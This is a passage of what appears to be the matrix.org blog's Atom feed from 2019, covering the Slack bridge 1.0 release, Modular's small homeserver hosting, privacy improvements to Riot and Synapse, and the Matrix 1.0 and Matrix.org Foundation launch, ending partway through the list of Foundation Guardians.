Threading &amp;amp; Reactions!&lt;&#x2F;p&gt;
&lt;p&gt;The bridge has undergone some pretty serious code surgery as well. The whole codebase has been rewritten in
TypeScript to take advantage of type checking and generic types. The bridge is currently based upon the
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-bridge&#x2F;&quot;&gt;matrix-appservice-bridge&lt;&#x2F;a&gt; library. The datastore interface now supports PostgreSQL, which allows for administrators to inspect and edit the database while the bridge is running, as well as offering  helpful performance boost over the NeDB datastore format that was used previously. Finally, the codebase has proper Unit and Integration Tests to ensure new changes will not cause any regressions in behaviour. In short, &lt;strong&gt;now is an excellent time to get involved and hack on the bridge&lt;&#x2F;strong&gt;. There is already a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-slack&#x2F;issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22&quot;&gt;crafted list of easy issues&lt;&#x2F;a&gt; for new and experienced bridge devs.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2019-10-03-slack1.0-perfmem.png&quot; alt=&quot;Grafana memory usage graph&quot; &#x2F;&gt;
Memory usage of the bridge comparison&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2019-10-03-slack1.0-perfcpu.png&quot; alt=&quot;Grafana CPU usage graph&quot; &#x2F;&gt;
CPU usage of the bridge comparison&lt;&#x2F;p&gt;
&lt;p&gt;In terms of how many users matrix.org is currently serving at the moment, we present to you some figures:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;2562 bridged rooms&lt;&#x2F;li&gt;
&lt;li&gt;764 teams connected to the bridge&lt;&#x2F;li&gt;
&lt;li&gt;103711 events have passed through the bridge since the launch of 0.3.2&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Of course, our work doesn’t stop at 1.0. The plan for the immediate future of the bridge
is to continue adding support for other event types coming from Matrix and Slack to create
an ever richer experience. Obvious features are things like topic changes, and syncing membership
across the bridge. In the long term future we would also like to add community support to the bridge,
so whole Slack workspaces can be bridged across with a single click.&lt;&#x2F;p&gt;
&lt;p&gt;That’s all from me, and I would like to say a massive thank you to &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;@Cadair:matrix.org&quot;&gt;Cadair&lt;&#x2F;a&gt;
and &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;@benpa:matrix.org&quot;&gt;Ben&lt;&#x2F;a&gt; for both their code and review work on the project and as always,
thank you to the community for using the bridge and reporting issues. 🙂&lt;&#x2F;p&gt;
&lt;p&gt;Useful links:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#matrix_appservice_slack:matrix.org&quot;&gt;Matrix Room&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-slack&quot;&gt;Project Home&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix-appservice-slack.readthedocs.io&#x2F;en&#x2F;stable&#x2F;&quot;&gt;Docs&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>5-user Matrix homeserver hosting now available from Modular</title>
        <published>2019-07-17T00:00:00+00:00</published>
        <updated>2019-07-17T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2019/07/17/5-user-matrix-homeserver-hosting-now-available-from-modular/" type="text/html"/>
        <id>https://matrix.org/blog/2019/07/17/5-user-matrix-homeserver-hosting-now-available-from-modular/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;If you’ve been looking for a way to have you own Matrix homeserver without having to run it yourself, you may be interested to hear that &lt;a href=&quot;https:&#x2F;&#x2F;modular.im&quot;&gt;Modular&lt;&#x2F;a&gt; (the Matrix hosting provider run by &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&quot;&gt;New Vector&lt;&#x2F;a&gt;, the startup which hires many of the Matrix core team) is now offering a personal-sized small homeserver hosting service, supporting a minimum size of 5 user servers.&lt;&#x2F;p&gt;
&lt;p&gt;A lot of recent performance work on Synapse has been driven by the need to make smaller dedicated servers more efficient to run - and so if you run your own homeserver you’ll be benefiting from all this work too :)  Meanwhile, if you choose to outsource your server hosting to Modular, you’ll be indirectly supporting core Matrix and Synapse development, given most of the core Matrix team work for New Vector - it’s through buying services like this which lets us keep folks able to hack on Matrix as their day job.&lt;&#x2F;p&gt;
&lt;p&gt;See more details &lt;a href=&quot;https:&#x2F;&#x2F;modular.im&#x2F;personal-hosted-homeservers&quot;&gt;over at the Modular blog post&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Tightening up privacy in Matrix</title>
        <published>2019-06-30T00:00:00+00:00</published>
        <updated>2019-06-30T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2019/06/30/tightening-up-privacy-in-matrix/" type="text/html"/>
        <id>https://matrix.org/blog/2019/06/30/tightening-up-privacy-in-matrix/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;A few weeks ago there was &lt;a href=&quot;https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=20178267&quot;&gt;some
discussion&lt;&#x2F;a&gt; around the privacy
of typical Matrix configurations, particularly how Riot&#x27;s default config uses
vector.im as an Identity Server (for discovering users on Matrix by their email
address or phone number) and scalar.vector.im as an Integration Manager (i.e.
the mechanism for adding hosted bots&#x2F;bridges&#x2F;widgets into rooms). This means
that Riot, even if using a custom homeserver and running from a custom Riot
deployment, will try to talk to *.vector.im (run  by New Vector; the company formed by the core
Matrix team in 2017) for some operations unless an alternative IS or IM has
been specified in the config.&lt;&#x2F;p&gt;
&lt;p&gt;We haven&#x27;t done as good a job at explaining this as we could have, and this
blog post is a progress update on how we&#x27;re fixing that and improving other
privacy considerations in general.&lt;&#x2F;p&gt;
&lt;p&gt;Firstly, the reason Riot is configured like this is for the user&#x27;s convenience:
in general, we believe most users just want to discover other people on Matrix
as easily as possible, and a logically-centralised server for looking up user
matrix IDs by email&#x2F;phone number (called third party IDs, or 3PIDs) is the only
comprehensive way of doing so.  Decentralising this data while protecting the
privacy of the 3PIDs and their matrix IDs is a Hard Problem which we&#x27;re unaware
of anyone having solved yet.  Alternatively, you could run a local identity
server, but it will end up having to delegate to a centralised identity server
anyway for IDs it has no other way to know about. Similarly, providing a
default integration server that just works out of the box (rather than
mandating the user configures their own) is a matter of trying to keep Riot&#x27;s
UX simple, especially when onboarding users, and especially given Riot&#x27;s
reputation for complexity at the best of times.&lt;&#x2F;p&gt;
&lt;p&gt;That said, the discussion highlighted some areas for improvement.
Specifically:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;When doing work on making Matrix &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2018&#x2F;05&#x2F;08&#x2F;gdpr-compliance-in-matrix&quot;&gt;GDPR
compliant&lt;&#x2F;a&gt;
back in May 2018, we set up a single &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;policies&#x2F;blob&#x2F;master&#x2F;docs&#x2F;matrix-org&#x2F;privacy_notice.md&quot;&gt;privacy
policy&lt;&#x2F;a&gt;
for the services we run, and got users to agree to it by locking them out of
the matrix.org homeserver until they did.  However, we missed that users not
on the matrix.org homeserver might still be using our Identity Service (IS)
&amp;amp; Integration Manager (IM) without accepting the privacy policy.  Over the
last few weeks we&#x27;ve been working on addressing this - it turns out that
it&#x27;s a pain to fix, given the Identity Service doesn&#x27;t have the concept of
users, so tracking which users have agreed to the policy policy or not means
some fairly major changes. The current proposal is to change the Identity
Service to use a form of OpenID to authenticate users against their
homeserver in order to check they&#x27;ve accepted the IS&#x27;s terms of use - see
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2140&quot;&gt;MSC2140&lt;&#x2F;a&gt; for the gory
details.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;Meanwhile, Riot is being updated to prompt the user to accept the IS &amp;amp; IM terms
of use (if different to the HS&#x27;s), and thus make it crystal clear to the user
that they are using an IS &amp;amp; IM and that they have the option not to if desired - see https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;10167 and associated
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+label%3Ap1+label%3Aprivacy+label%3Aphase%3A1+identity&quot;&gt;issues&lt;&#x2F;a&gt;.
This includes also explicitly prompting the user as to whether they want
3PIDs they provide at registration to be discoverable, as per
https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;10091.&lt;&#x2F;p&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;
&lt;p&gt;Riot on iOS &amp;amp; Android gives the option of scanning your local addressbook to
discover which of your contacts are on Matrix.  The wording explaining this
wasn&#x27;t clear enough on Android - which we &lt;a href=&quot;https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=20181515&quot;&gt;promptly
fixed&lt;&#x2F;a&gt;.  Separately, the
contact details sent to the server are currently not obfuscated.  This is
partially because we hadn&#x27;t got to it, and partially because obfuscating
them doesn&#x27;t actually help much with privacy, given an attacker can just
scan through possible obfuscated phone numbers and email addresses to
deobfuscate them.  However, we&#x27;ve been working through obfuscating the
contact details anyway by hashing as per
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2134&quot;&gt;MSC2134&lt;&#x2F;a&gt;, which has all
the details.  We&#x27;re also adding an explicit lookup warning in Riot&#x2F;Web, as
per https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;10093.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;There was a bug where Riot&#x2F;Web was querying the Integration Manager every
time you opened a room, even if that room had no integrations (actually, it
did it 3 times in a row).  This got &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-react-sdk&#x2F;pull&#x2F;3115&quot;&gt;fixed and
released&lt;&#x2F;a&gt; in
Riot&#x2F;Web 1.2.2 back on June 19th.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Matrix needs to authenticate whether events were actually sent by the server
that claimed to send them.  We do this by having servers sign their events
when they create them, and publishing the public half of their signing keys
for anyone to query.  However, this poses problems if you receive an event
which is signed by a server which isn&#x27;t currently online.  To solve this, we
have the concept of &lt;code&gt;trusted_key_servers&lt;&#x2F;code&gt; (aka notary servers), which your
server can query to see if they know about the missing server&#x27;s keys.  By
default, matrix.org is configured as Synapse&#x27;s trusted notary, but you can
of course change this. If you choose an unreliable server as the notary
(e.g. by not setting one at all) then there&#x27;s a risk that you won&#x27;t be able
to look up signing keys, and a splitbrain will result where your server
can&#x27;t receive certain events, but other servers in the room can.  This can
then result in your server being unable to participate in the room entirely,
if it&#x27;s missing key events in the room&#x27;s lifetime.&lt;&#x2F;p&gt;
&lt;p&gt;Our plan here is to get rid of notaries entirely by changing how event
signing works as per
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1228&quot;&gt;MSC1228&lt;&#x2F;a&gt;, but this is
going to take a while.  Meanwhile we&#x27;re going to check Synapse&#x27;s code to
ensure it doesn&#x27;t talk to the notary server unnecessarily.  (E.g. it should
be caching the signing keys locally, and it should only use the notary
server if the remote server is down.)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;When doing VoIP in Matrix, clients need to use a TURN server to discover
their network conditions and perform firewall traversal.  The TURN server
should be specified by your homeserver (and each homeserver deployment
should ideally include a TURN server).  However, for users who have not
configured a TURN server, Riot (on all 3 platforms) defaulted to use
Google&#x27;s public STUN service (&lt;code&gt;stun.l.google.com&lt;&#x2F;code&gt;).  STUN is a subset of
TURN which provides firewall discovery, but not traffic relaying.  This
slightly increased the chances of calls working for users without a proper
TURN server, but not by much - and rather than fall back to Google, we&#x27;ve
decided to simply remove it from Riot (e.g.
https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-ios-sdk&#x2F;commit&#x2F;24832a2b14fb72ae6f051d5aba40262d11eef65d).
This means that VoIP might get less reliable for users who were relying on
this fallback, but you really should be running your own TURN server anyway
if you want VoIP to work reliably on your homeserver.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;We should make it clearer in Riot that device names are world-readable, and
not just for the user&#x27;s own personal reference. This is
https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;10216&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;As you can see, much of the work on improving these issues is still in full
swing, although some has already shipped.  As should also be obvious, these
issues are categorically not malicious: Matrix (and Riot) literally exists to give users full control and autonomy over their communication, and privacy is a key part of that. These are avoidable issues which can and will be solved.  It&#x27;s worth noting that we have to prioritise privacy issues alongside all the other development in Matrix however: there&#x27;s no point in having excellent privacy if there are other bugs stopping the platform from being usable.&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;ll do another blog post to confirm once most of the fixes here have landed -
meanwhile, hopefully this post provides some useful visibility on how we&#x27;re
going about improving things.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Introducing Matrix 1.0 and the Matrix.org Foundation</title>
        <published>2019-06-11T00:00:00+00:00</published>
        <updated>2019-06-11T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2019/06/11/introducing-matrix-1-0-and-the-matrix-org-foundation/" type="text/html"/>
        <id>https://matrix.org/blog/2019/06/11/introducing-matrix-1-0-and-the-matrix-org-foundation/</id>
        
        <content type="html">&lt;h2 id=&quot;matrix-1-0&quot;&gt;Matrix 1.0&lt;&#x2F;h2&gt;
&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;We are very excited to announce the first fully stable release of the Matrix protocol and specification across **all **APIs - as well as the Synapse 1.0 reference implementation which implements the full Matrix 1.0 API surface.&lt;&#x2F;p&gt;
&lt;p&gt;This means that after just over 5 years since the initial work on Matrix began, we are proud to have finally &lt;strong&gt;exited beta&lt;&#x2F;strong&gt;!!  This is the conclusion of the work which we announced at &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;02&#x2F;04&#x2F;matrix-at-fosdem-2019&quot;&gt;FOSDEM 2019&lt;&#x2F;a&gt; when we cut the first stable release of the Server-Server API and began the Synapse 0.99 release series in anticipation of releasing a 1.0.&lt;&#x2F;p&gt;
&lt;p&gt;Now, before you get too excited, it’s critical to understand that Matrix 1.0 is all about providing a &lt;strong&gt;stable, self-consistent, self-contained and secure version of the standard&lt;&#x2F;strong&gt; which anyone should be able to use to independently implement production-grade Matrix clients, servers, bots and bridges etc.  It does &lt;strong&gt;not&lt;&#x2F;strong&gt; mean that all planned or possible features in Matrix are now specified and implemented, but that the most important core of the protocol is a well-defined stable platform for everyone to build on.&lt;&#x2F;p&gt;
&lt;p&gt;On the Synapse side, our focus has been exclusively on ensuring that Synapse correctly implements Matrix 1.0, to provide a stable and secure basis for participating in Matrix without risk of room corruption or other nastinesses.  However, we have deliberately &lt;strong&gt;not&lt;&#x2F;strong&gt; focused on performance or features in the 1.0 release - so I’m afraid that synapse’s RAM footprint will not have got significantly better, and your favourite long-awaited features (automatically defragmenting rooms with lots of forward extremities, configurable message retention, admin management web-interface etc) have not yet landed.  In other words, this is the opposite of the &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@RiotChat&#x2F;the-big-1-0-68fa7c6050be&quot;&gt;Riot 1.0 release&lt;&#x2F;a&gt; (where the entire app was redesigned and radically improved its performance and UX) - instead, we have adopted the mantra to &lt;a href=&quot;http:&#x2F;&#x2F;wiki.c2.com&#x2F;?MakeItWorkMakeItRightMakeItFast&quot;&gt;make it work, make it work right, and then (finally) make it fast&lt;&#x2F;a&gt;.  You can read the &lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;06&#x2F;11&#x2F;synapse-1-0-0-released&quot;&gt;full release notes&lt;&#x2F;a&gt; here.  It’s also worth looking at the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;release-v1.0.0&#x2F;CHANGES.md&quot;&gt;full changelog&lt;&#x2F;a&gt; through the Synapse 0.99 release series to see the massive amount of polishing that’s been going on here.&lt;&#x2F;p&gt;
&lt;p&gt;All this means that the main headline features which land in Matrix 1.0 are vitally important but relatively dry:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Using X.509 certificates to trust servers rather than perspective notaries, to simplify and improve server-side trust.  This is a &lt;strong&gt;breaking change&lt;&#x2F;strong&gt; across Matrix, and we’ve given the community several months now to ensure their homeservers run a valid TLS certificate.  See &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;docs&#x2F;MSC1711_certificates_FAQ.md&quot;&gt;MSC1711&lt;&#x2F;a&gt; for full details, and the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;24&#x2F;final-countdown-to-1-0&quot;&gt;2 week warning&lt;&#x2F;a&gt; we gave.  As of ~9am UTC today, the matrix.org homeserver is running Synapse 1.0 and enforcing valid TLS certificates - the transition has begun (and so far we haven’t spotted any major breakage :).  Thank you to everyone who &lt;a href=&quot;https:&#x2F;&#x2F;arewereadyyet.com&quot;&gt;got ready&lt;&#x2F;a&gt; in advance!&lt;&#x2F;li&gt;
&lt;li&gt;Using .well-known URIs to discover servers, in case you can’t get a valid TLS certificate for your server’s domain.&lt;&#x2F;li&gt;
&lt;li&gt;Switching to &lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;rooms&#x2F;v4.html&quot;&gt;room version 4&lt;&#x2F;a&gt; by default&lt;&#x2F;strong&gt; for creating new rooms.  This fixes the most important defects that the core room algorithm has historically encountered, particularly:
&lt;ul&gt;
&lt;li&gt;The new State Resolution algorithm to fix the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;2432&quot;&gt;Hotel California bug&lt;&#x2F;a&gt; and many others: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1442&quot;&gt;State Resolution Reloaded&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1659&quot;&gt;Collision resistant event IDs&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Specifying the ability to upgrade between room versions&lt;&#x2F;li&gt;
&lt;li&gt;Full specification of lazy loading room members&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1267&quot;&gt;Short Authentication String&lt;&#x2F;a&gt; (Emoji!) interactive verification of E2EE devices&lt;&#x2F;li&gt;
&lt;li&gt;...and lots and lots and lots of bugfixes and spec omission fixes.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;That said, there is a &lt;em&gt;lot&lt;&#x2F;em&gt; of really exciting stuff in flight right now which sadly didn’t stabilise in time for Matrix 1.0, but will be landing as fast as we can finalise it now that 1.0 is at last out the door.  This includes:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Editable messages!  (These are in Synapse 1.0 and Riot already, but still stabilising so not enabled by default)&lt;&#x2F;li&gt;
&lt;li&gt;Reactions! (Similarly these are in develop)&lt;&#x2F;li&gt;
&lt;li&gt;Threading!! (We’ve planted the seeds for this in the new ‘aggregations’ support which powers edits &amp;amp; reactions - but full thread support is still a bit further out).&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;uhoreg&#x2F;matrix-doc&#x2F;blob&#x2F;cross-signing2&#x2F;proposals&#x2F;1756-cross-signing.md&quot;&gt;Cross-signed verification for end-to-end encryption&lt;&#x2F;a&gt; (This is on a branch, but due to land any day now).  We’ve also held off merging E2E backups into the Matrix 1.0 spec until cross-signing lands, given it may change the backup behaviour a bit.  Once this is done, we can seriously talk about turning on E2E by default everywhere.&lt;&#x2F;li&gt;
&lt;li&gt;Live-tracking of room statistics and state in Synapse!  (This is in Synapse 1.0 already if you check out the new room_stats and room_state tables, but we need to provide a nice admin interface for it).&lt;&#x2F;li&gt;
&lt;li&gt;Support for smaller footprint homeservers by reducing memory usage and stopping them from joining overly complex rooms.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Then stuff which we haven’t yet started, but is now unlocked by the 1.0 release:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Fixing extremities build-up (and so massively improving performance)&lt;&#x2F;li&gt;
&lt;li&gt;Rewriting Communities.  Groups&#x2F;Communities deliberately didn’t land in Matrix 1.0 as the current implementation has issues we want to fix first.  &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1772&quot;&gt;MSC1772&lt;&#x2F;a&gt; has the details.&lt;&#x2F;li&gt;
&lt;li&gt;Rewritten room directory using the new room stats&#x2F;state tables to be super-speedy.&lt;&#x2F;li&gt;
&lt;li&gt;Super-speedy &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3122&quot;&gt;incremental state resolution&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Removing MXIDs from events (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1228&quot;&gt;MSC1228&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Just to give a quick taster of the shape of things to come, here’s RiotX&#x2F;Android, the all-new Riot client for Android, showing off Edits &amp;amp; Reactions in the wild…&lt;&#x2F;p&gt;
&lt;div style=&quot;text-align: center&quot;&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;edits.jpg&quot; style=&quot;height: 640px;&quot;&#x2F;&gt;
&lt;&#x2F;div&gt;
&lt;p&gt;...and here’s a screenshot of the final test jig for cross-signing devices in end-to-end encryption, so you will never have to manually verify new devices for a trusted user ever again!  We demoed a &lt;em&gt;very&lt;&#x2F;em&gt; early version of this at FOSDEM, but this here is the testing harness for real deal, after several iterations of the spec and implementation to nail down the model. + means the device&#x2F;user&#x27;s cross-signing key is trusted, T means it&#x27;s TOFU:&lt;&#x2F;p&gt;
&lt;div style=&quot;text-align: center&quot;&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;cross-signing.png&quot; style=&quot;height: 480px; margin: auto&quot;&#x2F;&gt;
&lt;&#x2F;div&gt;
&lt;p&gt;So, there you have it - welcome to Matrix 1.0, and we look forward to our backlog of feature work now landing!&lt;&#x2F;p&gt;
&lt;p&gt;Massive massive thanks to everyone who has stuck with the project over the years and helped support and grow Matrix - little did we think back in May 2014 that it’d take us this long to exit beta, but hopefully you’ll agree that it’s been worth it :)&lt;&#x2F;p&gt;
&lt;p&gt;Talking of which, we were looking through the photos we took from the first ever session hacking on Matrix back in May 2014…&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;nightmare.jpg&quot; alt=&quot;Whiteboard 1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;...suffice it to say that of the architectural options, we went with #3 in the end...&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;pl.jpg&quot; alt=&quot;Whiteboard 2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;...and that nowadays we actually know how power levels work, in excruciating and (hopefully) well-specified detail :)&lt;&#x2F;p&gt;
&lt;p&gt;There has been an absolutely enormous amount of work to pull Matrix 1.0 together - both on the spec side (thanks to the Spec Core Team for corralling proposals, and everyone who&#x27;s contributed proposals, and particularly to Travis for editing it all) and the implementation side (thanks to the whole Synapse team for the tedious task of cleaning up everything that was needed for 1.0).  And of course, huge thanks go to everyone who has been helping test and debug the Synapse 1.0 release candidates, or just supporting the project to get to this point :)&lt;&#x2F;p&gt;
&lt;h2 id=&quot;the-matrix-org-foundation&quot;&gt;The Matrix.org Foundation&lt;&#x2F;h2&gt;
&lt;p&gt;Finally, as promised, alongside Matrix 1.0, we are very happy to announce the official launch of the finalised Matrix.org Foundation!&lt;&#x2F;p&gt;
&lt;p&gt;This has been a long-running project to ensure that Matrix’s future is governed by a neutral non-profit custodian for the benefit of everyone in the Matrix ecosystem.  We started the process nearly a year ago back with the initial proposal &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2018&#x2F;06&#x2F;20&#x2F;towards-open-governance-for-matrix-org&quot;&gt;Towards Open Governance of Matrix.org&lt;&#x2F;a&gt;, and then legally &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2018&#x2F;10&#x2F;29&#x2F;introducing-the-matrix-org-foundation-part-1-of-2&quot;&gt;incorporated the Foundation&lt;&#x2F;a&gt; in October, and published the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;matthew&#x2F;msc1779&#x2F;proposals&#x2F;1779-open-governance.md&quot;&gt;final governance proposal&lt;&#x2F;a&gt; in January.&lt;&#x2F;p&gt;
&lt;p&gt;As of today the Foundation is finalised and operational, and all the assets for Matrix.org have been transferred from &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&quot;&gt;New Vector&lt;&#x2F;a&gt; (the startup we formed in 2017 to hire the core Matrix team).  In fact you may already have seen Matrix.org Foundation notices popping up all over the Matrix codebase (as all of New Vector’s work on the public Matrix codebase for the foreseeable is being assigned to the Matrix.org Foundation).&lt;&#x2F;p&gt;
&lt;p&gt;Most importantly, we’re excited to introduce the &lt;strong&gt;Guardians of the Matrix.org Foundation&lt;&#x2F;strong&gt;.  The Guardians are the legal directors of the non-profit Foundation, and are responsible for ensuring that the Foundation (and by extension the Spec Core Team) keeps on mission and neutrally protects the development of Matrix. Guardians are typically independent of the commercial Matrix ecosystem and may even not be members of today’s Matrix community, but are deeply aligned with the mission of the project. Guardians are selected to be respected and trusted by the wider community to uphold the guiding principles of the Foundation and keep the other Guardians honest.&lt;&#x2F;p&gt;
&lt;p&gt;We have started the Foundation with five Guardians - two being the original founders of the Matrix project (Matthew and Amandine) and three being entirely independent, thus ensuring the original Matrix team forms a minority which can be kept in check by the rest of the Guardians. The new Guardians are:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Prof. Jon Crowcroft - Marconi Professor of Communications Systems in the Computer Lab at the University of Cambridge and the Turing Institute. Jon is a pioneer in the field of decentralised communication, and a fellow of the Royal Society, the ACM, the British Computer Society, the Institution of Engineering and Technology, the Royal Academy of Engineering and the Institute of Electrical and Electronics Engineers.&lt;&#x2F;p&gt;
&lt;p&gt;Jon is a global expert in decentralisation and data privacy, and is excellently placed to help ensure Matrix stays true to its ideals.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Ross Schulman - Ross is a senior counsel and senior policy technologist at New America’s Open Technology Institute, where he focuses on internet measurement, emerging technologies, surveillance, and decentralization. Prior to joining OTI, Ross worked for Google.&lt;&#x2F;p&gt;
&lt;p&gt;Ross brings a unique perspective as a tech- and decentralisation-savvy lawyer to the Foundation, as well as being one of the first non-developers in the Matrix community to run his own homeserver. Ross has been known to walk around Mozfest clutching a battery-powered Synapse in a box, promoting decentralised communication for all.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Dr. Jutta Steiner - As co-founder and CEO of Parity Technologies, Jutta is dedicated to building a better internet - Web 3.0 - where users’ privacy &amp;amp; control come first. Parity Technologies is a leader in the blockchain space – known to many as the creator of one of the most popular Ethereum clients, it is also the creator of two ambitious new blockchain technlogies, Polkadot and Substrate, that make it easier to experiment and innovate on scalability, encryption and governance.&lt;&#x2F;p&gt;
